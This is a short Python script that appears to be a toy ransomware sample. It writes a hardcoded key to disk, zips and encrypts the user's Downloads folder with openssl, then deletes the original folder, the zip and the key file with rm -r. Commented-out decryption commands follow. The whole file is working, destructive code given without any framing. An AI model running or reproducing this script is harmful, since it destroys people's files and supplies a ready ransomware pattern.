import os

commands= [ \
"echo 'fQE2wGliZU2CuEgP3KG0VO92e5zWBUN9SFm+6jd57kA='>key.bin", \
"zip -r Downloads.zip Downloads", \
"openssl enc -aes-256-cbc -salt -in Downloads.zip -out Downloads.enc -pass file:./key.bin", \
"rm -r Downloads", \
"rm -r Downloads.zip", \
"rm key.bin"
]

for i in range(0,len(commands)):
        os.system(commands[i])

#decryption
"openssl enc -d -aes-256-cbc -in Downloads.enc -out Downloads.zip -pass file:./key.bin"
"unzip Downloads.zip"

